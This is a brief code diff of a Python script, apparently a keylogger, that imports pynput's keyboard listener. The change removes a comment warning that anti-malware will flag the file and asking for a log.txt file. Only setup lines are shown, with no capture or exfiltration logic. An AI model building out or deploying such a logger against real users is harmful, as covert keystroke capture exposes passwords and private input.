@@ -1,11 +1,6 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
-# REMINDER
-# Your anti-malware will detect this file if you run it on your system
-# if you do not have a log.txt file, create one and
-# put it in alongside this program
-
 c = 0
 
 keys = []
